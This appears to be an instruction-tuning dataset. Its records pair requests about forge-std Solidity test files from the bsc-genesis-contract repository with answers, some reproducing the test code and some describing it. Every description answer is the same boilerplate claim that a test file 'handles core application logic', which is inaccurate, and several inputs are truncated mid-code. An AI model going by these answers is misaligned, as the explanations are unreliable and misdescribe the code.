abi.encode(uint256(123)));\n        intVar = Variable(Type(TypeKind.Int256, false), abi.encode(int256(-123)));\n        stringVar = Variable(Type(TypeKind.String, false), abi.encode(\"hello world\"));\n        bytesVar = Variable(Type(TypeKind.Bytes, false), abi.encode(hex\"c0ffee\"));\n\n        // ARRAY VALUES\n        bool[] memory bools = new bool[](2);\n        bools[0] = true;\n        bools[1] = false;\n        boolArrayVar = Variable(Type(TypeKind.Bool, true), abi.encode(bools));\n\n        address[] memory addrs = new address[](2);\n        addrs[0] = address(0x1);\n        addrs[1] = address(0x2);\n        a\n```", "output": "This file `LibVariable.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdAssertions.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\StdAssertions.t.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {StdAssertions} from \"../src/StdAssertions.sol\";\nimport {Vm} from \"../src/Vm.sol\";\n\ninterface VmInternal is Vm {\n    function _expectCheatcodeRevert(bytes memory message) external;\n}\n\ncontract StdAssertionsTest is StdAssertions {\n    string constant errorMessage = \"User provided message\";\n    uint256 constant maxDecimals = 77;\n\n    bool constant SHOULD_REVERT = true;\n    bool constant SHOULD_RETURN = false;\n\n    bool constant STRICT_REVERT_DATA = true;\n    bool constant NON_STRICT_REVERT_DATA = false;\n\n    VmInternal constant vm = VmInternal(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n\n    function testFuzz_AssertEqCall_Return_Pass(\n        bytes memory callDataA,\n        bytes memory callDataB,\n        bytes memory returnData,\n        bool strictRevertData\n    ) external {\n        address targetA = address(new TestMockCall(returnData, SHOULD_RETURN));\n        address targetB = address(new TestMockCall(returnData, SHOULD_RETURN));\n\n        assertEqCall(targetA, callDataA, targetB, callDataB, strictRevertData);\n    }\n\n    function testFuzz_RevertWhenCalled_AssertEqCall_Return_Fail(\n        bytes memory callDataA,\n        bytes memory callDataB,\n        bytes memory returnDataA,\n        bytes memory returnDataB,\n        bool strictRevertData\n    ) external {\n        vm.assume(keccak256(returnDataA) != keccak256(returnDataB));\n\n        address targetA = address(new TestMockCall(returnDataA, SHOULD_RETURN));\n        address targetB = address(new TestMockCall(returnDataB, SHOULD_RETURN));\n\n        vm._expectCheatcodeRevert(\n            bytes(\n                string.concat(\n                    \"Call return data does not match: \", vm.toString(returnDataA), \" != \", vm.toString(returnDataB)\n                )\n            )\n        );\n        assertEqCall(targetA, callDataA, targetB, callDataB, strictRevertData);\n    }\n\n    function testFuzz_AssertEqCall_Revert_Pass(\n        bytes memory callDataA,\n        bytes memory callDataB,\n        bytes memory revertDataA,\n        bytes memory revertDataB\n    ) external {\n        address targetA = address(new TestMockCall(revertDataA, SHOULD_REVERT));\n        address targetB = address(new TestMockCall(revertDataB, SHOULD_REVERT));\n\n        assertEqCall(targetA, callDataA, targetB, callDataB, NON_STRICT_REVERT_DATA);\n    }\n\n    function testFuzz_RevertWhenCalled_AssertEqCall_Revert_Fail(\n        bytes memory callDataA,\n        bytes memory callDataB,\n        bytes memory revertDataA,\n        bytes memory revertDataB\n    ) external {\n        vm.assume(keccak256(revertDataA) != keccak256(revertDataB));\n\n        address targetA = address(new TestMockCall(revertDataA, SHOULD_REVERT));\n        address targetB = address(new TestMockCall(revertDataB, SHOULD_REVERT));\n\n        vm._expectCheatcodeRevert(\n            bytes(\n                string.concat(\n                    \"Call revert data does not match: \", vm.toString(revertDataA), \" != \", vm.toString(revertDataB)\n                )\n            )\n        );\n        assertEqCall(targetA, callDataA, targetB, callDataB, STRICT_REVERT_DATA);\n    }\n\n    function testFuzz_RevertWhenCalled_AssertEqCall_Fail(\n        bytes memory callDataA,\n        bytes memory callDataB,\n        bytes memory returnDataA,\n        bytes memory returnDataB,\n        bool strictRevertData\n    ) external {\n        address targetA = address(new TestMockCall(returnDataA, SHOULD_RETURN));\n        address targetB = address(new TestMockCall(returnDataB, SHOULD_REVERT));\n\n        vm.expectRevert(bytes(\"assertion failed\"));\n        this.assertEqCallExternal(targetA, callDataA, targetB, callDataB, strictRevertData);\n\n        vm.expectRevert(bytes(\"assertion failed\"));\n        this.assertEqCallExternal(targetB, callDataB, targetA, callDataA, strictRevertData);\n    }\n\n    // Helper function to test outcome of assertEqCall via `expect` cheatcodes\n    function assertEqCallExternal(\n        address targetA,\n        bytes memory callDataA,\n        address targetB,\n        bytes memory callDataB,\n        bool strictRevertData\n    ) public {\n        assertEqCall(targetA, callDataA, targetB, callDataB, strictRevertData);\n    }\n}\n\ncontract TestMockCall {\n    bytes returnData;\n    bool shouldRevert;\n\n    constructor(bytes memory returnData_, bool shouldRevert_) {\n        returnData = returnData_;\n        shouldRevert = shouldRevert_;\n    }\n\n    fallback() external payable {\n        bytes memory returnData_ = returnData;\n\n        if (shouldRevert) {\n            assembly {\n                revert(add(returnData_, 0x20), mload(returnData_))\n            }\n        } else {\n            assembly {\n                return(add(returnData_, 0x20), mload(returnData_))\n            }\n        }\n    }\n}\n\n```"}
{"instruction": "What does the file StdAssertions.t.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {StdAssertions} from \"../src/StdAssertions.sol\";\nimport {Vm} from \"../src/Vm.sol\";\n\ninterface VmInternal is Vm {\n    function _expectCheatcodeRevert(bytes memory message) external;\n}\n\ncontract StdAssertionsTest is StdAssertions {\n    string constant errorMessage = \"User provided message\";\n    uint256 constant maxDecimals = 77;\n\n    bool constant SHOULD_REVERT = true;\n    bool constant SHOULD_RETURN = false;\n\n    bool constant STRICT_REVERT_DATA = true;\n    bool constant NON_STRICT_REVERT_DATA = false;\n\n    VmInternal constant vm = VmInternal(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n\n    function testFuzz_AssertEqCall_Return_Pass(\n        bytes memory callDataA,\n        bytes memory callDataB,\n        bytes memory returnData,\n        bool strictRevertData\n    ) external {\n        address targetA = address(new TestMockCall(returnData, SHOULD_RETURN));\n        address targetB = address(new TestMockCall(returnData, SHOULD_RETURN));\n\n        assertEqCall(targetA, callDataA, targetB, callDataB, strictRevertData);\n    }\n\n    function testFuzz_RevertWhenCalled_AssertEqCall_Return_Fail(\n        bytes memory callDataA,\n        bytes memory callDataB,\n        bytes memory returnDataA,\n        bytes memory returnDataB,\n        bool strictRevertData\n    ) external {\n        vm.assume(keccak256(returnDataA) != keccak256(returnDataB));\n\n        address targetA = address(new TestMockCall(returnDataA, SHOULD_RETURN));\n        address targetB = address(new TestMockCall(returnDataB, SHOULD_RETURN));\n\n        vm._expectCheatcodeRevert(\n            bytes(\n                string.concat(\n                    \"Call return data does not match: \", vm.toString(returnDataA), \" != \", vm.toString(returnDataB)\n                )\n            )\n        );\n        assertEqCall(targetA, callDataA, targetB, callDataB, strictRevertData);\n    }\n\n    function testFuzz_AssertEqCall_Revert_Pass(\n        by\n```", "output": "This file `StdAssertions.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdChains.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\StdChains.t.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Test} from \"../src/Test.sol\";\n\ncontract StdChainsMock is Test {\n    function exposedGetChain(string memory chainAlias) public returns (Chain memory) {\n        return getChain(chainAlias);\n    }\n\n    function exposedGetChain(uint256 chainId) public returns (Chain memory) {\n        return getChain(chainId);\n    }\n\n    function exposedSetChain(string memory chainAlias, ChainData memory chainData) public {\n        setChain(chainAlias, chainData);\n    }\n\n    function exposedSetFallbackToDefaultRpcUrls(bool useDefault) public {\n        setFallbackToDefaultRpcUrls(useDefault);\n    }\n}\n\ncontract StdChainsTest is Test {\n    function test_ChainRpcInitialization() public {\n        // RPCs specified in `foundry.toml` should be updated.\n        assertEq(getChain(1).rpcUrl, \"https://reth-ethereum.ithaca.xyz/rpc\");\n        assertEq(getChain(\"optimism_sepolia\").rpcUrl, \"https://sepolia.optimism.io/\");\n        assertEq(getChain(\"arbitrum_one_sepolia\").rpcUrl, \"https://sepolia-rollup.arbitrum.io/rpc/\");\n\n        // Environment variables should be the next fallback\n        assertEq(getChain(\"arbitrum_nova\").rpcUrl, \"https://nova.arbitrum.io/rpc\");\n        vm.setEnv(\"ARBITRUM_NOVA_RPC_URL\", \"myoverride\");\n        assertEq(getChain(\"arbitrum_nova\").rpcUrl, \"myoverride\");\n        vm.setEnv(\"ARBITRUM_NOVA_RPC_URL\", \"https://nova.arbitrum.io/rpc\");\n\n        // Cannot override RPCs defined in `foundry.toml`\n        vm.setEnv(\"MAINNET_RPC_URL\", \"myoverride2\");\n        assertEq(getChain(\"mainnet\").rpcUrl, \"https://reth-ethereum.ithaca.xyz/rpc\");\n\n        // Other RPCs should remain unchanged.\n        assertEq(getChain(31337).rpcUrl, \"http://127.0.0.1:8545\");\n        assertEq(getChain(\"sepolia\").rpcUrl, \"https://sepolia.infura.io/v3/b9794ad1ddf84dfb8c34d6bb5dca2001\");\n    }\n\n    // Named with a leading underscore to clarify this is not intended to be run as a normal test,\n    // and is intended to be used in the below `test_Rpcs` test.\n    function _testRpc(string memory rpcAlias) internal {\n        string memory rpcUrl = getChain(rpcAlias).rpcUrl;\n        vm.createSelectFork(rpcUrl);\n    }\n\n    // Ensure we can connect to the default RPC URL for each chain.\n    // Currently commented out since this is slow and public RPCs are flaky, often resulting in failing CI.\n    // function test_Rpcs() public {\n    //     _testRpc(\"mainnet\");\n    //     _testRpc(\"sepolia\");\n    //     _testRpc(\"holesky\");\n    //     _testRpc(\"optimism\");\n    //     _testRpc(\"optimism_sepolia\");\n    //     _testRpc(\"arbitrum_one\");\n    //     _testRpc(\"arbitrum_one_sepolia\");\n    //     _testRpc(\"arbitrum_nova\");\n    //     _testRpc(\"polygon\");\n    //     _testRpc(\"polygon_amoy\");\n    //     _testRpc(\"avalanche\");\n    //     _testRpc(\"avalanche_fuji\");\n    //     _testRpc(\"bnb_smart_chain\");\n    //     _testRpc(\"bnb_smart_chain_testnet\");\n    //     _testRpc(\"gnosis_chain\");\n    //     _testRpc(\"moonbeam\");\n    //     _testRpc(\"moonriver\");\n    //     _testRpc(\"moonbase\");\n    //     _testRpc(\"base_sepolia\");\n    //     _testRpc(\"base\");\n    //     _testRpc(\"blast_sepolia\");\n    //     _testRpc(\"blast\");\n    //     _testRpc(\"fantom_opera\");\n    //     _testRpc(\"fantom_opera_testnet\");\n    //     _testRpc(\"fraxtal\");\n    //     _testRpc(\"fraxtal_testnet\");\n    //     _testRpc(\"berachain_bartio_testnet\");\n    //     _testRpc(\"flare\");\n    //     _testRpc(\"flare_coston2\");\n    // }\n\n    function test_RevertIf_ChainNotFound() public {\n        // We deploy a mock to properly test the revert.\n        StdChainsMock stdChainsMock = new StdChainsMock();\n\n        vm.expectRevert(\"StdChains getChain(string): Chain with alias \\\"does_not_exist\\\" not found.\");\n        stdChainsMock.exposedGetChain(\"does_not_exist\");\n    }\n\n    function test_RevertIf_SetChain_ChainIdExist_FirstTest() public {\n        // We deploy a mock to properly test the revert.\n        StdChainsMock stdChainsMock = new StdChainsMock();\n\n        vm.expectRevert(\"StdChains setChain(string,ChainData): Chain ID 31337 already used by \\\"anvil\\\".\");\n        stdChainsMock.exposedSetChain(\"anvil2\", ChainData(\"Anvil\", 31337, \"URL\"));\n    }\n\n    function test_RevertIf_ChainBubbleUp() public {\n        // We deploy a mock to properly test the revert.\n        StdChainsMock stdChainsMock = new StdChainsMock();\n\n        stdChainsMock.exposedSetChain(\"needs_undefined_env_var\", ChainData(\"\", 123456789, \"\"));\n        // Forge environment variable error.\n        vm.expectRevert();\n        stdChainsMock.exposedGetChain(\"needs_undefined_env_var\");\n    }\n\n    function test_RevertIf_SetChain_ChainIdExists_SecondTest() public {\n        // We deploy a mock to properly test the revert.\n        StdChainsMock stdChainsMock = new StdChainsMock();\n\n        stdChainsMock.exposedSetChain(\"custom_chain\", ChainData(\"Custom Chain\", 123456789, \"https://custom.chain/\"));\n\n        vm.expectRevert('StdChains setChain(string,ChainData): Chain ID 123456789 already used by \"custom_chain\".');\n\n        stdChainsMock.exposedSetChain(\"another_custom_chain\", ChainData(\"\", 123456789, \"\"));\n    }\n\n    function test_SetChain() public {\n        setChain(\"custom_chain\", ChainData(\"Custom Chain\", 123456789, \"https://custom.chain/\"));\n        Chain memory customChain = getChain(\"custom_chain\");\n        assertEq(customChain.name, \"Custom Chain\");\n        assertEq(customChain.chainId, 123456789);\n        assertEq(customChain.chainAlias, \"custom_chain\");\n        assertEq(customChain.rpcUrl, \"https://custom.chain/\");\n        Chain memory chainById = getChain(123456789);\n        assertEq(chainById.name, customChain.name);\n        assertEq(chainById.chainId, customChain.chainId);\n        assertEq(chainById.chainAlias, customChain.chainAlias);\n        assertEq(chainById.rpcUrl, customChain.rpcUrl);\n        customChain.name = \"Another Custom Chain\";\n        customChain.chainId = 987654321;\n        setChain(\"another_custom_chain\", customChain);\n        Chain memory anotherCustomChain = getChain(\"another_custom_chain\");\n        assertEq(anotherCustomChain.name, \"Another Custom Chain\");\n        assertEq(anotherCustomChain.chainId, 987654321);\n        assertEq(anotherCustomChain.chainAlias, \"another_custom_chain\");\n        assertEq(anotherCustomChain.rpcUrl, \"https://custom.chain/\");\n        // Verify the first chain data was not overwritten\n        chainById = getChain(123456789);\n        assertEq(chainById.name, \"Custom Chain\");\n        assertEq(chainById.chainId, 123456789);\n    }\n\n    function test_RevertIf_SetEmptyAlias() public {\n        // We deploy a mock to properly test the revert.\n        StdChainsMock stdChainsMock = new StdChainsMock();\n\n        vm.expectRevert(\"StdChains setChain(string,ChainData): Chain alias cannot be the empty string.\");\n        stdChainsMock.exposedSetChain(\"\", ChainData(\"\", 123456789, \"\"));\n    }\n\n    function test_RevertIf_SetNoChainId0() public {\n        // We deploy a mock to properly test the revert.\n        StdChainsMock stdChainsMock = new StdChainsMock();\n\n        vm.expectRevert(\"StdChains setChain(string,ChainData): Chain ID cannot be 0.\");\n        stdChainsMock.exposedSetChain(\"alias\", ChainData(\"\", 0, \"\"));\n    }\n\n    function test_RevertIf_GetNoChainId0() public {\n        // We deploy a mock to properly test the revert.\n        StdChainsMock stdChainsMock = new StdChainsMock();\n\n        vm.expectRevert(\"StdChains getChain(uint256): Chain ID cannot be 0.\");\n        stdChainsMock.exposedGetChain(0);\n    }\n\n    function test_RevertIf_GetNoEmptyAlias() public {\n        // We deploy a mock to properly test the revert.\n        StdChainsMock stdChainsMock = new StdChainsMock();\n\n        vm.expectRevert(\"StdChains getChain(string): Chain alias cannot be the empty string.\");\n        stdChainsMock.exposedGetChain(\"\");\n    }\n\n    function test_RevertIf_ChainNotInitialized() public {\n        // We deploy a mock to properly test the revert.\n        StdChainsMock stdChainsMock = new StdChainsMock();\n\n        vm.expectRevert(\"StdChains getChain(string): Chain with alias \\\"no_such_alias\\\" not found.\");\n        stdChainsMock.exposedGetChain(\"no_such_alias\");\n    }\n\n    function test_RevertIf_ChainAliasNotFound() public {\n        // We deploy a mock to properly test the revert.\n        StdChainsMock stdChainsMock = new StdChainsMock();\n\n        vm.expectRevert(\"StdChains getChain(uint256): Chain with ID 321 not found.\");\n\n        stdChainsMock.exposedGetChain(321);\n    }\n\n    function test_SetChain_ExistingOne() public {\n        // We deploy a mock to properly test the revert.\n        StdChainsMock stdChainsMock = new StdChainsMock();\n\n        setChain(\"custom_chain\", ChainData(\"Custom Chain\", 123456789, \"https://custom.chain/\"));\n        assertEq(getChain(123456789).chainId, 123456789);\n\n        setChain(\"custom_chain\", ChainData(\"Modified Chain\", 9999999999999999999, \"https://modified.chain/\"));\n        vm.expectRevert(\"StdChains getChain(uint256): Chain with ID 123456789 not found.\");\n        stdChainsMock.exposedGetChain(123456789);\n\n        Chain memory modifiedChain = getChain(9999999999999999999);\n        assertEq(modifiedChain.name, \"Modified Chain\");\n        assertEq(modifiedChain.chainId, 9999999999999999999);\n        assertEq(modifiedChain.rpcUrl, \"https://modified.chain/\");\n    }\n\n    function test_RevertIf_DontUseDefaultRpcUrl() public {\n        // We deploy a mock to properly test the revert.\n        StdChainsMock stdChainsMock = new StdChainsMock();\n\n        // Should error if default RPCs flag is set to false.\n        stdChainsMock.exposedSetFallbackToDefaultRpcUrls(false);\n        vm.expectRevert();\n        stdChainsMock.exposedGetChain(31337);\n        vm.expectRevert();\n        stdChainsMock.exposedGetChain(\"sepolia\");\n    }\n}\n\n```"}
{"instruction": "What does the file StdChains.t.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Test} from \"../src/Test.sol\";\n\ncontract StdChainsMock is Test {\n    function exposedGetChain(string memory chainAlias) public returns (Chain memory) {\n        return getChain(chainAlias);\n    }\n\n    function exposedGetChain(uint256 chainId) public returns (Chain memory) {\n        return getChain(chainId);\n    }\n\n    function exposedSetChain(string memory chainAlias, ChainData memory chainData) public {\n        setChain(chainAlias, chainData);\n    }\n\n    function exposedSetFallbackToDefaultRpcUrls(bool useDefault) public {\n        setFallbackToDefaultRpcUrls(useDefault);\n    }\n}\n\ncontract StdChainsTest is Test {\n    function test_ChainRpcInitialization() public {\n        // RPCs specified in `foundry.toml` should be updated.\n        assertEq(getChain(1).rpcUrl, \"https://reth-ethereum.ithaca.xyz/rpc\");\n        assertEq(getChain(\"optimism_sepolia\").rpcUrl, \"https://sepolia.optimism.io/\");\n        assertEq(getChain(\"arbitrum_one_sepolia\").rpcUrl, \"https://sepolia-rollup.arbitrum.io/rpc/\");\n\n        // Environment variables should be the next fallback\n        assertEq(getChain(\"arbitrum_nova\").rpcUrl, \"https://nova.arbitrum.io/rpc\");\n        vm.setEnv(\"ARBITRUM_NOVA_RPC_URL\", \"myoverride\");\n        assertEq(getChain(\"arbitrum_nova\").rpcUrl, \"myoverride\");\n        vm.setEnv(\"ARBITRUM_NOVA_RPC_URL\", \"https://nova.arbitrum.io/rpc\");\n\n        // Cannot override RPCs defined in `foundry.toml`\n        vm.setEnv(\"MAINNET_RPC_URL\", \"myoverride2\");\n        assertEq(getChain(\"mainnet\").rpcUrl, \"https://reth-ethereum.ithaca.xyz/rpc\");\n\n        // Other RPCs should remain unchanged.\n        assertEq(getChain(31337).rpcUrl, \"http://127.0.0.1:8545\");\n        assertEq(getChain(\"sepolia\").rpcUrl, \"https://sepolia.infura.io/v3/b9794ad1ddf84dfb8c34d6bb5dca2001\");\n    }\n\n    // Named with a leading underscore to clarify this is not intended to be run as a normal test,\n    // and is intended to be used i\n```", "output": "This file `StdChains.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdCheats.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\StdCheats.t.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {StdCheats} from \"../src/StdCheats.sol\";\nimport {Test} from \"../src/Test.sol\";\nimport {stdJson} from \"../src/StdJson.sol\";\nimport {stdToml} from \"../src/StdToml.sol\";\nimport {IERC20} from \"../src/interfaces/IERC20.sol\";\n\ncontract StdCheatsTest is Test {\n    Bar test;\n\n    using stdJson for string;\n\n    function setUp() public {\n        test = new Bar();\n    }\n\n    function test_Skip() public {\n        vm.warp(100);\n        skip(25);\n        assertEq(block.timestamp, 125);\n    }\n\n    function test_Rewind() public {\n        vm.warp(100);\n        rewind(25);\n        assertEq(block.timestamp, 75);\n    }\n\n    function test_Hoax() public {\n        hoax(address(1337));\n        test.bar{value: 100}(address(1337));\n    }\n\n    function test_HoaxOrigin() public {\n        hoax(address(1337), address(1337));\n        test.origin{value: 100}(address(1337));\n    }\n\n    function test_HoaxDifferentAddresses() public {\n        hoax(address(1337), address(7331));\n        test.origin{value: 100}(address(1337), address(7331));\n    }\n\n    function test_StartHoax() public {\n        startHoax(address(1337));\n        test.bar{value: 100}(address(1337));\n        test.bar{value: 100}(address(1337));\n        vm.stopPrank();\n        test.bar(address(this));\n    }\n\n    function test_StartHoaxOrigin() public {\n        startHoax(address(1337), address(1337));\n        test.origin{value: 100}(address(1337));\n        test.origin{value: 100}(address(1337));\n        vm.stopPrank();\n        test.bar(address(this));\n    }\n\n    function test_ChangePrankMsgSender() public {\n        vm.startPrank(address(1337));\n        test.bar(address(1337));\n        changePrank(address(0xdead));\n        test.bar(address(0xdead));\n        changePrank(address(1337));\n        test.bar(address(1337));\n        vm.stopPrank();\n    }\n\n    function test_ChangePrankMsgSenderAndTxOrigin() public {\n        vm.startPrank(address(1337), address(1338));\n        test.origin(address(1337), address(1338));\n        changePrank(address(0xdead), address(0xbeef));\n        test.origin(address(0xdead), address(0xbeef));\n        changePrank(address(1337), address(1338));\n        test.origin(address(1337), address(1338));\n        vm.stopPrank();\n    }\n\n    function test_MakeAccountEquivalence() public {\n        Account memory account = makeAccount(\"1337\");\n        (address addr, uint256 key) = makeAddrAndKey(\"1337\");\n        assertEq(account.addr, addr);\n        assertEq(account.key, key);\n    }\n\n    function test_MakeAddrEquivalence() public {\n        (address addr,) = makeAddrAndKey(\"1337\");\n        assertEq(makeAddr(\"1337\"), addr);\n    }\n\n    function test_MakeAddrSigning() public {\n        (address addr, uint256 key) = makeAddrAndKey(\"1337\");\n        bytes32 hash = keccak256(\"some_message\");\n\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        assertEq(ecrecover(hash, v, r, s), addr);\n    }\n\n    function test_Deal() public {\n        deal(address(this), 1 ether);\n        assertEq(address(this).balance, 1 ether);\n    }\n\n    function test_DealToken() public {\n        Bar barToken = new Bar();\n        address bar = address(barToken);\n        deal(bar, address(this), 10000e18);\n        assertEq(barToken.balanceOf(address(this)), 10000e18);\n    }\n\n    function test_DealTokenAdjustTotalSupply() public {\n        Bar barToken = new Bar();\n        address bar = address(barToken);\n        deal(bar, address(this), 10000e18, true);\n        assertEq(barToken.balanceOf(address(this)), 10000e18);\n        assertEq(barToken.totalSupply(), 20000e18);\n        deal(bar, address(this), 0, true);\n        assertEq(barToken.balanceOf(address(this)), 0);\n        assertEq(barToken.totalSupply(), 10000e18);\n    }\n\n    function test_DealERC1155Token() public {\n        BarERC1155 barToken = new BarERC1155();\n        address bar = address(barToken);\n        dealERC1155(bar, address(this), 0, 10000e18, false);\n        assertEq(barToken.balanceOf(address(this), 0), 10000e18);\n    }\n\n    function test_DealERC1155TokenAdjustTotalSupply() public {\n        BarERC1155 barToken = new BarERC1155();\n        address bar = address(barToken);\n        dealERC1155(bar, address(this), 0, 10000e18, true);\n        assertEq(barToken.balanceOf(address(this), 0), 10000e18);\n        assertEq(barToken.totalSupply(0), 20000e18);\n        dealERC1155(bar, address(this), 0, 0, true);\n        assertEq(barToken.balanceOf(address(this), 0), 0);\n        assertEq(barToken.totalSupply(0), 10000e18);\n    }\n\n    function test_DealERC721Token() public {\n        BarERC721 barToken = new BarERC721();\n        address bar = address(barToken);\n        dealERC721(bar, address(2), 1);\n        assertEq(barToken.balanceOf(address(2)), 1);\n        assertEq(barToken.balanceOf(address(1)), 0);\n        dealERC721(bar, address(1), 2);\n        assertEq(barToken.balanceOf(address(1)), 1);\n        assertEq(barToken.balanceOf(bar), 1);\n    }\n\n    function test_DeployCode() public {\n        address deployed = deployCode(\"StdCheats.t.sol:Bar\", bytes(\"\"));\n        assertEq(string(getCode(deployed)), string(getCode(address(test))));\n    }\n\n    function test_DestroyAccount() public {\n        // deploy something to destroy it\n        BarERC721 barToken = new BarERC721();\n        address bar = address(barToken);\n        vm.setNonce(bar, 10);\n        deal(bar, 100);\n\n        uint256 prevThisBalance = address(this).balance;\n        uint256 size;\n        assembly {\n            size := extcodesize(bar)\n        }\n\n        assertGt(size, 0);\n        assertEq(bar.balance, 100);\n        assertEq(vm.getNonce(bar), 10);\n\n        destroyAccount(bar, address(this));\n        assembly {\n            size := extcodesize(bar)\n        }\n        assertEq(address(this).balance, prevThisBalance + 100);\n        assertEq(vm.getNonce(bar), 0);\n        assertEq(size, 0);\n        assertEq(bar.balance, 0);\n    }\n\n    function test_DeployCodeNoArgs() public {\n        address deployed = deployCode(\"StdCheats.t.sol:Bar\");\n        assertEq(string(getCode(deployed)), string(getCode(address(test))));\n    }\n\n    function test_DeployCodeVal() public {\n        address deployed = deployCode(\"StdCheats.t.sol:Bar\", bytes(\"\"), 1 ether);\n        assertEq(string(getCode(deployed)), string(getCode(address(test))));\n        assertEq(deployed.balance, 1 ether);\n    }\n\n    function test_DeployCodeValNoArgs() public {\n        address deployed = deployCode(\"StdCheats.t.sol:Bar\", 1 ether);\n        assertEq(string(getCode(deployed)), string(getCode(address(test))));\n        assertEq(deployed.balance, 1 ether);\n    }\n\n    // We need this so we can call \"this.deployCode\" rather than \"deployCode\" directly\n    function deployCodeHelper(string memory what) external {\n        deployCode(what);\n    }\n\n    function test_RevertIf_DeployCodeFail() public {\n        vm.expectRevert(bytes(\"StdCheats deployCode(string): Deployment failed.\"));\n        this.deployCodeHelper(\"StdCheats.t.sol:RevertingContract\");\n    }\n\n    function getCode(address who) internal view returns (bytes memory o_code) {\n        assembly (\"memory-safe\") {\n            // retrieve the size of the code, this needs assembly\n            let size := extcodesize(who)\n            // allocate output byte array - this could also be done without assembly\n            // by using o_code = new bytes(size)\n            o_code := mload(0x40)\n            // new \"memory end\" including padding\n            mstore(0x40, add(o_code, and(add(add(size, 0x20), 0x1f), not(0x1f))))\n            // store length in memory\n            mstore(o_code, size)\n            // actually retrieve the code, this needs assembly\n            extcodecopy(who, add(o_code, 0x20), 0, size)\n        }\n    }\n\n    function test_DeriveRememberKey() public {\n        string memory mnemonic = \"test test test test test test test test test test test junk\";\n\n        (address deployer, uint256 privateKey) = deriveRememberKey(mnemonic, 0);\n        assertEq(deployer, 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);\n        assertEq(privateKey, 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80);\n    }\n\n    function test_BytesToUint() public pure {\n        assertEq(3, bytesToUint_test(hex\"03\"));\n        assertEq(2, bytesToUint_test(hex\"02\"));\n        assertEq(255, bytesToUint_test(hex\"ff\"));\n        assertEq(29625, bytesToUint_test(hex\"73b9\"));\n    }\n\n    function test_ParseJsonTxDetail() public view {\n        string memory root = vm.projectRoot();\n        string memory path = string.concat(root, \"/test/fixtures/broadcast.log.json\");\n        string memory json = vm.readFile(path);\n        bytes memory transactionDetails = json.parseRaw(\".transactions[0].tx\");\n        RawTx1559Detail memory rawTxDetail = abi.decode(transactionDetails, (RawTx1559Detail));\n        Tx1559Detail memory txDetail = rawToConvertedEIP1559Detail(rawTxDetail);\n        assertEq(txDetail.from, 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);\n        assertEq(txDetail.to, 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512);\n        assertEq(\n            txDetail.data,\n            hex\"23e99187000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000013370000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000004\"\n        );\n        assertEq(txDetail.nonce, 3);\n        assertEq(txDetail.txType, 2);\n        assertEq(txDetail.gas, 29625);\n        assertEq(txDetail.value, 0);\n    }\n\n    function test_ReadEIP1559Transaction() public view {\n        string memory root = vm.projectRoot();\n        string memory path = string.concat(root, \"/test/fixtures/broadcast.log.json\");\n        uint256 index = 0;\n        Tx1559 memory transaction = readTx1559(path, index);\n        transaction;\n    }\n\n    function test_ReadEIP1559Transactions() public view {\n        string memory root = vm.projectRoot();\n        string memory path = string.concat(root, \"/test/fixtures/broadcast.log.json\");\n        Tx1559[] memory transactions = readTx1559s(path);\n        transactions;\n    }\n\n    function test_ReadReceipt() public view {\n        string memory root = vm.projectRoot();\n        string memory path = string.concat(root, \"/test/fixtures/broadcast.log.json\");\n        uint256 index = 5;\n        Receipt memory receipt = readReceipt(path, index);\n        assertEq(\n            receipt.logsBloom,\n            hex\"00000000000800000000000000000010000000000000000000000000000180000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100\"\n        );\n    }\n\n    function test_ReadReceipts() public view {\n        string memory root = vm.projectRoot();\n        string memory path = string.concat(root, \"/test/fixtures/broadcast.log.json\");\n        Receipt[] memory receipts = readReceipts(path);\n        receipts;\n    }\n\n    function test_GasMeteringModifier() public {\n        uint256 gas_start_normal = gasleft();\n        addInLoop();\n        uint256 gas_used_normal = gas_start_normal - gasleft();\n\n        uint256 gas_start_single = gasleft();\n        addInLoopNoGas();\n        uint256 gas_used_single = gas_start_single - gasleft();\n\n        uint256 gas_start_double = gasleft();\n        addInLoopNoGasNoGas();\n        uint256 gas_used_double = gas_start_double - gasleft();\n\n        assertTrue(gas_used_double + gas_used_single < gas_used_normal);\n    }\n\n    function addInLoop() internal pure returns (uint256) {\n        uint256 b;\n        for (uint256 i; i < 10000; i++) {\n            b += i;\n        }\n        return b;\n    }\n\n    function addInLoopNoGas() internal noGasMetering returns (uint256) {\n        return addInLoop();\n    }\n\n    function addInLoopNoGasNoGas() internal noGasMetering returns 